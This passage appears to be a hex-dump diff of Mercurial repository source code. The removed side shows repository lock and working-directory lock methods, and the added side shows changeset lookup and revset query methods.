-0001b610: 6974 6f72 7920 6973 2066 756c 6c79 2075  itory is fully u
-0001b620: 6e6c 6f63 6b65 640a 0a20 2020 2020 2020  nlocked..       
-0001b630: 2054 6865 2063 616c 6c62 6163 6b20 7769   The callback wi
-0001b640: 6c6c 2062 6520 6578 6563 7574 6564 2077  ll be executed w
-0001b650: 6865 6e20 7468 6520 6f75 7465 726d 6f73  hen the outermos
-0001b660: 7420 6c6f 636b 2069 7320 7265 6c65 6173  t lock is releas
-0001b670: 6564 0a20 2020 2020 2020 2028 7769 7468  ed.        (with
-0001b680: 2077 6c6f 636b 2062 6569 6e67 2068 6967   wlock being hig
-0001b690: 6865 7220 6c65 7665 6c20 7468 616e 2027  her level than '
-0001b6a0: 6c6f 636b 2729 2e22 2222 0a20 2020 2020  lock').""".     
-0001b6b0: 2020 2066 6f72 2072 6566 2069 6e20 2873     for ref in (s
-0001b6c0: 656c 662e 5f77 6c6f 636b 7265 662c 2073  elf._wlockref, s
-0001b6d0: 656c 662e 5f6c 6f63 6b72 6566 293a 0a20  elf._lockref):. 
-0001b6e0: 2020 2020 2020 2020 2020 206c 203d 2072             l = r
-0001b6f0: 6566 2061 6e64 2072 6566 2829 0a20 2020  ef and ref().   
-0001b700: 2020 2020 2020 2020 2069 6620 6c20 616e           if l an
-0001b710: 6420 6c2e 6865 6c64 3a0a 2020 2020 2020  d l.held:.      
-0001b720: 2020 2020 2020 2020 2020 6c2e 706f 7374            l.post
-0001b730: 7265 6c65 6173 652e 6170 7065 6e64 2863  release.append(c
-0001b740: 616c 6c62 6163 6b29 0a20 2020 2020 2020  allback).       
-0001b750: 2020 2020 2020 2020 2062 7265 616b 0a20           break. 
-0001b760: 2020 2020 2020 2065 6c73 653a 2020 2320         else:  # 
-0001b770: 6e6f 206c 6f63 6b20 6861 7665 2062 6565  no lock have bee
-0001b780: 6e20 666f 756e 642e 0a20 2020 2020 2020  n found..       
-0001b790: 2020 2020 2063 616c 6c62 6163 6b28 5472       callback(Tr
-0001b7a0: 7565 290a 0a20 2020 2064 6566 206c 6f63  ue)..    def loc
-0001b7b0: 6b28 7365 6c66 2c20 7761 6974 3d54 7275  k(self, wait=Tru
-0001b7c0: 6529 3a0a 2020 2020 2020 2020 2222 224c  e):.        """L
-0001b7d0: 6f63 6b20 7468 6520 7265 706f 7369 746f  ock the reposito
-0001b7e0: 7279 2073 746f 7265 2028 2e68 672f 7374  ry store (.hg/st
-0001b7f0: 6f72 6529 2061 6e64 2072 6574 7572 6e20  ore) and return 
-0001b800: 6120 7765 616b 2072 6566 6572 656e 6365  a weak reference
-0001b810: 0a20 2020 2020 2020 2074 6f20 7468 6520  .        to the 
-0001b820: 6c6f 636b 2e20 5573 6520 7468 6973 2062  lock. Use this b
-0001b830: 6566 6f72 6520 6d6f 6469 6679 696e 6720  efore modifying 
-0001b840: 7468 6520 7374 6f72 6520 2865 2e67 2e20  the store (e.g. 
-0001b850: 636f 6d6d 6974 7469 6e67 206f 720a 2020  committing or.  
-0001b860: 2020 2020 2020 7374 7269 7070 696e 6729        stripping)
-0001b870: 2e20 4966 2079 6f75 2061 7265 206f 7065  . If you are ope
-0001b880: 6e69 6e67 2061 2074 7261 6e73 6163 7469  ning a transacti
-0001b890: 6f6e 2c20 6765 7420 6120 6c6f 636b 2061  on, get a lock a
-0001b8a0: 7320 7765 6c6c 2e29 0a0a 2020 2020 2020  s well.)..      
-0001b8b0: 2020 4966 2062 6f74 6820 276c 6f63 6b27    If both 'lock'
-0001b8c0: 2061 6e64 2027 776c 6f63 6b27 206d 7573   and 'wlock' mus
-0001b8d0: 7420 6265 2061 6371 7569 7265 642c 2065  t be acquired, e
-0001b8e0: 6e73 7572 6520 796f 7520 616c 7761 7973  nsure you always
-0001b8f0: 2061 6371 7569 7265 730a 2020 2020 2020   acquires.      
-0001b900: 2020 2777 6c6f 636b 2720 6669 7273 7420    'wlock' first 
-0001b910: 746f 2061 766f 6964 2061 2064 6561 642d  to avoid a dead-
-0001b920: 6c6f 636b 2068 617a 6172 642e 2222 220a  lock hazard.""".
-0001b930: 2020 2020 2020 2020 6c20 3d20 7365 6c66          l = self
-0001b940: 2e5f 6375 7272 656e 746c 6f63 6b28 7365  ._currentlock(se
-0001b950: 6c66 2e5f 6c6f 636b 7265 6629 0a20 2020  lf._lockref).   
-0001b960: 2020 2020 2069 6620 6c20 6973 206e 6f74       if l is not
-0001b970: 204e 6f6e 653a 0a20 2020 2020 2020 2020   None:.         
-0001b980: 2020 206c 2e6c 6f63 6b28 290a 2020 2020     l.lock().    
-0001b990: 2020 2020 2020 2020 7265 7475 726e 206c          return l
-0001b9a0: 0a0a 2020 2020 2020 2020 6c20 3d20 7365  ..        l = se
-0001b9b0: 6c66 2e5f 6c6f 636b 280a 2020 2020 2020  lf._lock(.      
-0001b9c0: 2020 2020 2020 7666 733d 7365 6c66 2e73        vfs=self.s
-0001b9d0: 7666 732c 0a20 2020 2020 2020 2020 2020  vfs,.           
-0001b9e0: 206c 6f63 6b6e 616d 653d 6222 6c6f 636b   lockname=b"lock
-0001b9f0: 222c 0a20 2020 2020 2020 2020 2020 2077  ",.            w
-0001ba00: 6169 743d 7761 6974 2c0a 2020 2020 2020  ait=wait,.      
-0001ba10: 2020 2020 2020 7265 6c65 6173 6566 6e3d        releasefn=
-0001ba20: 4e6f 6e65 2c0a 2020 2020 2020 2020 2020  None,.          
-0001ba30: 2020 6163 7175 6972 6566 6e3d 7365 6c66    acquirefn=self
-0001ba40: 2e69 6e76 616c 6964 6174 652c 0a20 2020  .invalidate,.   
-0001ba50: 2020 2020 2020 2020 2064 6573 633d 5f28           desc=_(
-0001ba60: 6227 7265 706f 7369 746f 7279 2025 7327  b'repository %s'
-0001ba70: 2920 2520 7365 6c66 2e6f 7269 6772 6f6f  ) % self.origroo
-0001ba80: 742c 0a20 2020 2020 2020 2029 0a20 2020  t,.        ).   
-0001ba90: 2020 2020 2073 656c 662e 5f6c 6f63 6b72       self._lockr
-0001baa0: 6566 203d 2077 6561 6b72 6566 2e72 6566  ef = weakref.ref
-0001bab0: 286c 290a 2020 2020 2020 2020 7265 7475  (l).        retu
-0001bac0: 726e 206c 0a0a 2020 2020 6465 6620 776c  rn l..    def wl
-0001bad0: 6f63 6b28 7365 6c66 2c20 7761 6974 3d54  ock(self, wait=T
-0001bae0: 7275 6529 3a0a 2020 2020 2020 2020 2222  rue):.        ""
-0001baf0: 224c 6f63 6b20 7468 6520 6e6f 6e2d 7374  "Lock the non-st
-0001bb00: 6f72 6520 7061 7274 7320 6f66 2074 6865  ore parts of the
-0001bb10: 2072 6570 6f73 6974 6f72 7920 2865 7665   repository (eve
-0001bb20: 7279 7468 696e 6720 756e 6465 720a 2020  rything under.  
-0001bb30: 2020 2020 2020 2e68 6720 6578 6365 7074        .hg except
-0001bb40: 202e 6867 2f73 746f 7265 2920 616e 6420   .hg/store) and 
-0001bb50: 7265 7475 726e 2061 2077 6561 6b20 7265  return a weak re
-0001bb60: 6665 7265 6e63 6520 746f 2074 6865 206c  ference to the l
-0001bb70: 6f63 6b2e 0a0a 2020 2020 2020 2020 5573  ock...        Us
-0001bb80: 6520 7468 6973 2062 6566 6f72 6520 6d6f  e this before mo
-0001bb90: 6469 6679 696e 6720 6669 6c65 7320 696e  difying files in
-0001bba0: 202e 6867 2e0a 0a20 2020 2020 2020 2049   .hg...        I
-0001bbb0: 6620 626f 7468 2027 6c6f 636b 2720 616e  f both 'lock' an
-0001bbc0: 6420 2777 6c6f 636b 2720 6d75 7374 2062  d 'wlock' must b
-0001bbd0: 6520 6163 7175 6972 6564 2c20 656e 7375  e acquired, ensu
-0001bbe0: 7265 2079 6f75 2061 6c77 6179 7320 6163  re you always ac
-0001bbf0: 7175 6972 6573 0a20 2020 2020 2020 2027  quires.        '
-0001bc00: 776c 6f63 6b27 2066 6972 7374 2074 6f20  wlock' first to 
-0001bc10: 6176 6f69 6420 6120 6465 6164 2d6c 6f63  avoid a dead-loc
-0001bc20: 6b20 6861 7a61 7264 2e22 2222 0a20 2020  k hazard.""".   
-0001bc30: 2020 2020 206c 203d 2073 656c 662e 5f77       l = self._w
-0001bc40: 6c6f 636b 7265 6628 2920 6966 2073 656c  lockref() if sel
-0001bc50: 662e 5f77 6c6f 636b 7265 6620 656c 7365  f._wlockref else
-0001bc60: 204e 6f6e 650a 2020 2020 2020 2020 6966   None.        if
-0001bc70: 206c 2069 7320 6e6f 7420 4e6f 6e65 2061   l is not None a
-0001bc80: 6e64 206c 2e68 656c 643a 0a20 2020 2020  nd l.held:.     
-0001bc90: 2020 2020 2020 206c 2e6c 6f63 6b28 290a         l.lock().
-0001bca0: 2020 2020 2020 2020 2020 2020 7265 7475              retu
-0001bcb0: 726e 206c 0a0a 2020 2020 2020 2020 2320  rn l..        # 
-0001bcc0: 5765 2064 6f20 6e6f 7420 6e65 6564 2074  We do not need t
-0001bcd0: 6f20 6368 6563 6b20 666f 7220 6e6f 6e2d  o check for non-
-0001bce0: 7761 6974 696e 6720 6c6f 636b 2061 6371  waiting lock acq
-0001bcf0: 7569 7369 7469 6f6e 2e20 2053 7563 680a  uisition.  Such.
-0001bd00: 2020 2020 2020 2020 2320 6163 7175 6973          # acquis
-0001bd10: 6974 696f 6e20 776f 756c 6420 6e6f 7420  ition would not 
-0001bd20: 6361 7573 6520 6465 6164 2d6c 6f63 6b20  cause dead-lock 
-0001bd30: 6173 2074 6865 7920 776f 756c 6420 6a75  as they would ju
-0001bd40: 7374 2066 6169 6c2e 0a20 2020 2020 2020  st fail..       
-0001bd50: 2069 6620 7761 6974 2061 6e64 2028 0a20   if wait and (. 
-0001bd60: 2020 2020 2020 2020 2020 2073 656c 662e             self.
-0001bd70: 7569 2e63 6f6e 6669 6762 6f6f 6c28 6227  ui.configbool(b'
-0001bd80: 6465 7665 6c27 2c20 6227 616c 6c2d 7761  devel', b'all-wa
-0001bd90: 726e 696e 6773 2729 0a20 2020 2020 2020  rnings').       
-0001bda0: 2020 2020 206f 7220 7365 6c66 2e75 692e       or self.ui.
-0001bdb0: 636f 6e66 6967 626f 6f6c 2862 2764 6576  configbool(b'dev
-0001bdc0: 656c 272c 2062 2763 6865 636b 2d6c 6f63  el', b'check-loc
-0001bdd0: 6b73 2729 0a20 2020 2020 2020 2029 3a0a  ks').        ):.
-0001bde0: 2020 2020 2020 2020 2020 2020 6966 2073              if s
-0001bdf0: 656c 662e 5f63 7572 7265 6e74 6c6f 636b  elf._currentlock
-0001be00: 2873 656c 662e 5f6c 6f63 6b72 6566 2920  (self._lockref) 
-0001be10: 6973 206e 6f74 204e 6f6e 653a 0a20 2020  is not None:.   
-0001be20: 2020 2020 2020 2020 2020 2020 2073 656c               sel
-0001be30: 662e 7569 2e64 6576 656c 7761 726e 2862  f.ui.develwarn(b
-0001be40: 2722 776c 6f63 6b22 2061 6371 7569 7265  '"wlock" acquire
-0001be50: 6420 6166 7465 7220 226c 6f63 6b22 2729  d after "lock"')
-0001be60: 0a0a 2020 2020 2020 2020 6465 6620 756e  ..        def un
-0001be70: 6c6f 636b 2829 3a0a 2020 2020 2020 2020  lock():.        
-0001be80: 2020 2020 6966 2073 656c 662e 6469 7273      if self.dirs
-0001be90: 7461 7465 2e69 735f 6368 616e 6769 6e67  tate.is_changing
-0001bea0: 5f61 6e79 3a0a 2020 2020 2020 2020 2020  _any:.          
-0001beb0: 2020 2020 2020 6d73 6720 3d20 6222 776c        msg = b"wl
-0001bec0: 6f63 6b20 7265 6c65 6173 6520 696e 2074  ock release in t
-0001bed0: 6865 206d 6964 646c 6520 6f66 2061 2063  he middle of a c
-0001bee0: 6861 6e67 696e 6720 7061 7265 6e74 7322  hanging parents"
-0001bef0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-0001bf00: 2073 656c 662e 7569 2e64 6576 656c 7761   self.ui.develwa
-0001bf10: 726e 286d 7367 290a 2020 2020 2020 2020  rn(msg).        
-0001bf20: 2020 2020 2020 2020 7365 6c66 2e64 6972          self.dir
-0001bf30: 7374 6174 652e 696e 7661 6c69 6461 7465  state.invalidate
-0001bf40: 2829 0a20 2020 2020 2020 2020 2020 2065  ().            e
-0001bf50: 6c73 653a 0a20 2020 2020 2020 2020 2020  lse:.           
-0001bf60: 2020 2020 2069 6620 7365 6c66 2e64 6972       if self.dir
-0001bf70: 7374 6174 652e 5f64 6972 7479 3a0a 2020  state._dirty:.  
-0001bf80: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001bf90: 2020 6d73 6720 3d20 6222 6469 7274 7920    msg = b"dirty 
-0001bfa0: 6469 7273 7461 7465 206f 6e20 776c 6f63  dirstate on wloc
-0001bfb0: 6b20 7265 6c65 6173 6522 0a20 2020 2020  k release".     
-0001bfc0: 2020 2020 2020 2020 2020 2020 2020 2073                 s
-0001bfd0: 656c 662e 7569 2e64 6576 656c 7761 726e  elf.ui.develwarn
-0001bfe0: 286d 7367 290a 2020 2020 2020 2020 2020  (msg).          
-0001bff0: 2020 2020 2020 7365 6c66 2e64 6972 7374        self.dirst
-0001c000: 6174 652e 7772 6974 6528 4e6f 6e65 290a  ate.write(None).
-0001c010: 0a20 2020 2020 2020 2020 2020 2075 6e66  .            unf
-0001c020: 6920 3d20 7365 6c66 2e75 6e66 696c 7465  i = self.unfilte
-0001c030: 7265 6428 290a 2020 2020 2020 2020 2020  red().          
-0001c040: 2020 6966 2027 6469 7273 7461 7465 2720    if 'dirstate' 
-0001c050: 696e 2075 6e66 692e 5f5f 6469 6374 5f5f  in unfi.__dict__
-0001c060: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
-0001c070: 2020 6465 6c20 756e 6669 2e5f 5f64 6963    del unfi.__dic
-0001c080: 745f 5f5b 2764 6972 7374 6174 6527 5d0a  t__['dirstate'].
-0001c090: 0a20 2020 2020 2020 206c 203d 2073 656c  .        l = sel
-0001c0a0: 662e 5f6c 6f63 6b28 0a20 2020 2020 2020  f._lock(.       
-0001c0b0: 2020 2020 2073 656c 662e 7666 732c 0a20       self.vfs,. 
-0001c0c0: 2020 2020 2020 2020 2020 2062 2277 6c6f             b"wlo
-0001c0d0: 636b 222c 0a20 2020 2020 2020 2020 2020  ck",.           
-0001c0e0: 2077 6169 742c 0a20 2020 2020 2020 2020   wait,.         
-0001c0f0: 2020 2075 6e6c 6f63 6b2c 0a20 2020 2020     unlock,.     
-0001c100: 2020 2020 2020 2073 656c 662e 696e 7661         self.inva
-0001c110: 6c69 6461 7465 6469 7273 7461 7465 2c0a  lidatedirstate,.
-0001c120: 2020 2020 2020 2020 2020 2020 5f28 6227              _(b'
-0001c130: 776f 726b 696e 6720 6469 7265 6374 6f72  working director
-0001c140: 7920 6f66 2025 7327 2920 2520 7365 6c66  y of %s') % self
-0001c150: 2e6f 7269 6772 6f6f 742c 0a20 2020 2020  .origroot,.     
-0001c160: 2020 2029 0a20 2020 2020 2020 2073 656c     ).        sel
-0001c170: 662e 5f77 6c6f 636b 7265 6620 3d20 7765  f._wlockref = we
-0001c180: 616b 7265 662e 7265 6628 6c29 0a20 2020  akref.ref(l).   
-0001c190: 2020 2020 2072 6574 7572 6e20 6c0a 0a20       return l.. 
-0001c1a0: 2020 2064 6566 205f 6375 7272 656e 746c     def _currentl
-0001c1b0: 6f63 6b28 7365 6c66 2c20 6c6f 636b 7265  ock(self, lockre
-0001c1c0: 6629 3a0a 2020 2020 2020 2020 2222 2252  f):.        """R
-0001c1d0: 6574 7572 6e73 2074 6865 206c 6f63 6b20  eturns the lock 
-0001c1e0: 6966 2069 7427 7320 6865 6c64 2c20 6f72  if it's held, or
-0001c1f0: 204e 6f6e 6520 6966 2069 7427 7320 6e6f   None if it's no
-0001c200: 742e 2222 220a 2020 2020 2020 2020 6966  t.""".        if
-0001c210: 206c 6f63 6b72 6566 2069 7320 4e6f 6e65   lockref is None
-0001c220: 3a0a 2020 2020 2020 2020 2020 2020 7265  :.            re
-0001c230: 7475 726e 204e 6f6e 650a 2020 2020 2020  turn None.      
-0001c240: 2020 6c20 3d20 6c6f 636b 7265 6628 290a    l = lockref().
-0001c250: 2020 2020 2020 2020 6966 206c 2069 7320          if l is 
-0001c260: 4e6f 6e65 206f 7220 6e6f 7420 6c2e 6865  None or not l.he
-0001c270: 6c64 3a0a 2020 2020 2020 2020 2020 2020  ld:.            
-0001c280: 7265 7475 726e 204e 6f6e 650a 2020 2020  return None.    
-0001c290: 2020 2020 7265 7475 726e 206c 0a0a 2020      return l..  
-0001c2a0: 2020 6465 6620 6375 7272 656e 7477 6c6f    def currentwlo
-0001c2b0: 636b 2873 656c 6629 3a0a 2020 2020 2020  ck(self):.      
-0001c2c0: 2020 2222 2252 6574 7572 6e73 2074 6865    """Returns the
-0001c2d0: 2077 6c6f 636b 2069 6620 6974 2773 2068   wlock if it's h
-0001c2e0: 656c 642c 206f 7220 4e6f 6e65 2069 6620  eld, or None if 
-0001c2f0: 6974 2773 206e 6f74 2e22 2222 0a20 2020  it's not.""".   
-0001c300: 2020 2020 2072 6574 7572 6e20 7365 6c66       return self
-0001c310: 2e5f 6375 7272 656e 746c 6f63 6b28 7365  ._currentlock(se
-0001c320: 6c66 2e5f 776c 6f63 6b72 6566 290a 0a20  lf._wlockref).. 
-0001c330: 2020 2064 6566 2063 7572 7265 6e74 6c6f     def currentlo
-0001c340: 636b 2873 656c 6629 3a0a 2020 2020 2020  ck(self):.      
-0001c350: 2020 2222 2252 6574 7572 6e73 2074 6865    """Returns the
-0001c360: 206c 6f63 6b20 6966 2069 7427 7320 6865   lock if it's he
-0001c370: 6c64 2c20 6f72 204e 6f6e 6520 6966 2069  ld, or None if i
-0001c380: 7427 7320 6e6f 742e 2222 220a 2020 2020  t's not.""".    
-0001c390: 2020 2020 7265 7475 726e 2073 656c 662e      return self.
-0001c3a0: 5f63 7572 7265 6e74 6c6f 636b 2873 656c  _currentlock(sel
-0001c3b0: 662e 5f6c 6f63 6b72 6566 290a 0a20 2020  f._lockref)..   
-0001c3c0: 2064 6566 2063 6865 636b 636f 6d6d 6974   def checkcommit
-0001c3d0: 7061 7474 6572 6e73 2873 656c 662c 2077  patterns(self, w
-0001c3e0: 6374 782c 206d 6174 6368 2c20 7374 6174  ctx, match, stat
-0001c3f0: 7573 2c20 6661 696c 293a 0a20 2020 2020  us, fail):.     
-0001c400: 2020 2022 2222 6368 6563 6b20 666f 7220     """check for 
-0001c410: 636f 6d6d 6974 2061 7267 756d 656e 7473  commit arguments
-0001c420: 2074 6861 7420 6172 656e 2774 2063 6f6d   that aren't com
-0001c430: 6d69 7474 6162 6c65 2222 220a 2020 2020  mittable""".    
-0001c440: 2020 2020 6966 206d 6174 6368 2e69 7365      if match.ise
-0001c450: 7861 6374 2829 206f 7220 6d61 7463 682e  xact() or match.
-0001c460: 7072 6566 6978 2829 3a0a 2020 2020 2020  prefix():.      
-0001c470: 2020 2020 2020 6d61 7463 6865 6420 3d20        matched = 
-0001c480: 7365 7428 7374 6174 7573 2e6d 6f64 6966  set(status.modif
-0001c490: 6965 6420 2b20 7374 6174 7573 2e61 6464  ied + status.add
-0001c4a0: 6564 202b 2073 7461 7475 732e 7265 6d6f  ed + status.remo
-0001c4b0: 7665 6429 0a0a 2020 2020 2020 2020 2020  ved)..          
-0001c4c0: 2020 666f 7220 6620 696e 206d 6174 6368    for f in match
-0001c4d0: 2e66 696c 6573 2829 3a0a 2020 2020 2020  .files():.      
-0001c4e0: 2020 2020 2020 2020 2020 6620 3d20 7365            f = se
-0001c4f0: 6c66 2e64 6972 7374 6174 652e 6e6f 726d  lf.dirstate.norm
-0001c500: 616c 697a 6528 6629 0a20 2020 2020 2020  alize(f).       
-0001c510: 2020 2020 2020 2020 2069 6620 6620 3d3d           if f ==
-0001c520: 2062 272e 2720 6f72 2066 2069 6e20 6d61   b'.' or f in ma
-0001c530: 7463 6865 6420 6f72 2066 2069 6e20 7763  tched or f in wc
-0001c540: 7478 2e73 7562 7374 6174 653a 0a20 2020  tx.substate:.   
-0001c550: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001c560: 2063 6f6e 7469 6e75 650a 2020 2020 2020   continue.      
-0001c570: 2020 2020 2020 2020 2020 6966 2066 2069            if f i
-0001c580: 6e20 7374 6174 7573 2e64 656c 6574 6564  n status.deleted
-0001c590: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
-0001c5a0: 2020 2020 2020 6661 696c 2866 2c20 5f28        fail(f, _(
-0001c5b0: 6227 6669 6c65 206e 6f74 2066 6f75 6e64  b'file not found
-0001c5c0: 2127 2929 0a20 2020 2020 2020 2020 2020  !')).           
-0001c5d0: 2020 2020 2023 2049 7320 6974 2061 2064       # Is it a d
-0001c5e0: 6972 6563 746f 7279 2074 6861 7420 6578  irectory that ex
-0001c5f0: 6973 7473 206f 7220 7573 6564 2074 6f20  ists or used to 
-0001c600: 6578 6973 743f 0a20 2020 2020 2020 2020  exist?.         
-0001c610: 2020 2020 2020 2069 6620 7365 6c66 2e77         if self.w
-0001c620: 7666 732e 6973 6469 7228 6629 206f 7220  vfs.isdir(f) or 
-0001c630: 7763 7478 2e70 3128 292e 6861 7364 6972  wctx.p1().hasdir
-0001c640: 2866 293a 0a20 2020 2020 2020 2020 2020  (f):.           
-0001c650: 2020 2020 2020 2020 2064 203d 2066 202b           d = f +
-0001c660: 2062 272f 270a 2020 2020 2020 2020 2020   b'/'.          
-0001c670: 2020 2020 2020 2020 2020 666f 7220 6d66            for mf
-0001c680: 2069 6e20 6d61 7463 6865 643a 0a20 2020   in matched:.   
+000111d0: 205f 2862 2275 6e6b 6e6f 776e 2072 6576   _(b"unknown rev
+000111e0: 6973 696f 6e20 2725 7327 2229 2025 2070  ision '%s'") % p
+000111f0: 7963 6f6d 7061 742e 6279 7465 7374 7228  ycompat.bytestr(
+00011200: 6368 616e 6765 6964 290a 2020 2020 2020  changeid).      
+00011210: 2020 2020 2020 290a 2020 2020 2020 2020        ).        
+00011220: 6578 6365 7074 2065 7272 6f72 2e57 6469  except error.Wdi
+00011230: 7255 6e73 7570 706f 7274 6564 3a0a 2020  rUnsupported:.  
+00011240: 2020 2020 2020 2020 2020 7265 7475 726e            return
+00011250: 2063 6f6e 7465 7874 2e77 6f72 6b69 6e67   context.working
+00011260: 6374 7828 7365 6c66 290a 0a20 2020 2064  ctx(self)..    d
+00011270: 6566 205f 5f63 6f6e 7461 696e 735f 5f28  ef __contains__(
+00011280: 7365 6c66 2c20 6368 616e 6765 6964 293a  self, changeid):
+00011290: 0a20 2020 2020 2020 2022 2222 5472 7565  .        """True
+000112a0: 2069 6620 7468 6520 6769 7665 6e20 6368   if the given ch
+000112b0: 616e 6765 6964 2065 7869 7374 7322 2222  angeid exists"""
+000112c0: 0a20 2020 2020 2020 2074 7279 3a0a 2020  .        try:.  
+000112d0: 2020 2020 2020 2020 2020 7365 6c66 5b63            self[c
+000112e0: 6861 6e67 6569 645d 0a20 2020 2020 2020  hangeid].       
+000112f0: 2020 2020 2072 6574 7572 6e20 5472 7565       return True
+00011300: 0a20 2020 2020 2020 2065 7863 6570 7420  .        except 
+00011310: 6572 726f 722e 5265 706f 4c6f 6f6b 7570  error.RepoLookup
+00011320: 4572 726f 723a 0a20 2020 2020 2020 2020  Error:.         
+00011330: 2020 2072 6574 7572 6e20 4661 6c73 650a     return False.
+00011340: 0a20 2020 2064 6566 205f 5f6e 6f6e 7a65  .    def __nonze
+00011350: 726f 5f5f 2873 656c 6629 3a0a 2020 2020  ro__(self):.    
+00011360: 2020 2020 7265 7475 726e 2054 7275 650a      return True.
+00011370: 0a20 2020 205f 5f62 6f6f 6c5f 5f20 3d20  .    __bool__ = 
+00011380: 5f5f 6e6f 6e7a 6572 6f5f 5f0a 0a20 2020  __nonzero__..   
+00011390: 2064 6566 205f 5f6c 656e 5f5f 2873 656c   def __len__(sel
+000113a0: 6629 3a0a 2020 2020 2020 2020 2320 6e6f  f):.        # no
+000113b0: 206e 6565 6420 746f 2070 6179 2074 6865   need to pay the
+000113c0: 2063 6f73 7420 6f66 2072 6570 6f76 6965   cost of repovie
+000113d0: 772e 6368 616e 6765 6c6f 670a 2020 2020  w.changelog.    
+000113e0: 2020 2020 756e 6669 203d 2073 656c 662e      unfi = self.
+000113f0: 756e 6669 6c74 6572 6564 2829 0a20 2020  unfiltered().   
+00011400: 2020 2020 2072 6574 7572 6e20 6c65 6e28       return len(
+00011410: 756e 6669 2e63 6861 6e67 656c 6f67 290a  unfi.changelog).
+00011420: 0a20 2020 2064 6566 205f 5f69 7465 725f  .    def __iter_
+00011430: 5f28 7365 6c66 293a 0a20 2020 2020 2020  _(self):.       
+00011440: 2072 6574 7572 6e20 6974 6572 2873 656c   return iter(sel
+00011450: 662e 6368 616e 6765 6c6f 6729 0a0a 2020  f.changelog)..  
+00011460: 2020 6465 6620 7265 7673 2873 656c 662c    def revs(self,
+00011470: 2065 7870 723a 2062 7974 6573 2c20 2a61   expr: bytes, *a
+00011480: 7267 7329 3a0a 2020 2020 2020 2020 2222  rgs):.        ""
+00011490: 2246 696e 6420 7265 7669 7369 6f6e 7320  "Find revisions 
+000114a0: 6d61 7463 6869 6e67 2061 2072 6576 7365  matching a revse
+000114b0: 742e 0a0a 2020 2020 2020 2020 5468 6520  t...        The 
+000114c0: 7265 7673 6574 2069 7320 7370 6563 6966  revset is specif
+000114d0: 6965 6420 6173 2061 2073 7472 696e 6720  ied as a string 
+000114e0: 6060 6578 7072 6060 2074 6861 7420 6d61  ``expr`` that ma
+000114f0: 7920 636f 6e74 6169 6e0a 2020 2020 2020  y contain.      
+00011500: 2020 252d 666f 726d 6174 7469 6e67 2074    %-formatting t
+00011510: 6f20 6573 6361 7065 2063 6572 7461 696e  o escape certain
+00011520: 2074 7970 6573 2e20 5365 6520 6060 7265   types. See ``re
+00011530: 7673 6574 6c61 6e67 2e66 6f72 6d61 7473  vsetlang.formats
+00011540: 7065 6360 602e 0a0a 2020 2020 2020 2020  pec``...        
+00011550: 5265 7673 6574 2061 6c69 6173 6573 2066  Revset aliases f
+00011560: 726f 6d20 7468 6520 636f 6e66 6967 7572  rom the configur
+00011570: 6174 696f 6e20 6172 6520 6e6f 7420 6578  ation are not ex
+00011580: 7061 6e64 6564 2e20 546f 2065 7870 616e  panded. To expan
+00011590: 640a 2020 2020 2020 2020 7573 6572 2061  d.        user a
+000115a0: 6c69 6173 6573 2c20 636f 6e73 6964 6572  liases, consider
+000115b0: 2063 616c 6c69 6e67 2060 6073 636d 7574   calling ``scmut
+000115c0: 696c 2e72 6576 7261 6e67 6528 2960 6020  il.revrange()`` 
+000115d0: 6f72 0a20 2020 2020 2020 2060 6072 6570  or.        ``rep
+000115e0: 6f2e 616e 7972 6576 7328 5b65 7870 725d  o.anyrevs([expr]
+000115f0: 2c20 7573 6572 3d54 7275 6529 6060 2e0a  , user=True)``..
+00011600: 0a20 2020 2020 2020 2052 6574 7572 6e73  .        Returns
+00011610: 2061 2073 6d61 7274 7365 742e 6162 7374   a smartset.abst
+00011620: 7261 6374 736d 6172 7473 6574 2c20 7768  ractsmartset, wh
+00011630: 6963 6820 6973 2061 206c 6973 742d 6c69  ich is a list-li
+00011640: 6b65 2069 6e74 6572 6661 6365 0a20 2020  ke interface.   
+00011650: 2020 2020 2074 6861 7420 636f 6e74 6169       that contai
+00011660: 6e73 2069 6e74 6567 6572 2072 6576 6973  ns integer revis
+00011670: 696f 6e73 2e0a 2020 2020 2020 2020 2222  ions..        ""
+00011680: 220a 2020 2020 2020 2020 7472 6565 203d  ".        tree =
+00011690: 2072 6576 7365 746c 616e 672e 7370 6563   revsetlang.spec
+000116a0: 7472 6565 2865 7870 722c 202a 6172 6773  tree(expr, *args
+000116b0: 290a 2020 2020 2020 2020 7265 7475 726e  ).        return
+000116c0: 2072 6576 7365 742e 6d61 6b65 6d61 7463   revset.makematc
+000116d0: 6865 7228 7472 6565 2928 7365 6c66 290a  her(tree)(self).
+000116e0: 0a20 2020 2064 6566 2073 6574 2873 656c  .    def set(sel
+000116f0: 662c 2065 7870 723a 2062 7974 6573 2c20  f, expr: bytes, 
+00011700: 2a61 7267 7329 3a0a 2020 2020 2020 2020  *args):.        
+00011710: 2222 2246 696e 6420 7265 7669 7369 6f6e  """Find revision
+00011720: 7320 6d61 7463 6869 6e67 2061 2072 6576  s matching a rev
+00011730: 7365 7420 616e 6420 656d 6974 2063 6861  set and emit cha
+00011740: 6e67 6563 7478 2069 6e73 7461 6e63 6573  ngectx instances
+00011750: 2e0a 0a20 2020 2020 2020 2054 6869 7320  ...        This 
+00011760: 6973 2061 2063 6f6e 7665 6e69 656e 6365  is a convenience
+00011770: 2077 7261 7070 6572 2061 726f 756e 6420   wrapper around 
+00011780: 6060 7265 7673 2829 6060 2074 6861 7420  ``revs()`` that 
+00011790: 6974 6572 6174 6573 2074 6865 0a20 2020  iterates the.   
+000117a0: 2020 2020 2072 6573 756c 7420 616e 6420       result and 
+000117b0: 6973 2061 2067 656e 6572 6174 6f72 206f  is a generator o
+000117c0: 6620 6368 616e 6765 6374 7820 696e 7374  f changectx inst
+000117d0: 616e 6365 732e 0a0a 2020 2020 2020 2020  ances...        
+000117e0: 5265 7673 6574 2061 6c69 6173 6573 2066  Revset aliases f
+000117f0: 726f 6d20 7468 6520 636f 6e66 6967 7572  rom the configur
+00011800: 6174 696f 6e20 6172 6520 6e6f 7420 6578  ation are not ex
+00011810: 7061 6e64 6564 2e20 546f 2065 7870 616e  panded. To expan
+00011820: 640a 2020 2020 2020 2020 7573 6572 2061  d.        user a
+00011830: 6c69 6173 6573 2c20 636f 6e73 6964 6572  liases, consider
+00011840: 2063 616c 6c69 6e67 2060 6073 636d 7574   calling ``scmut
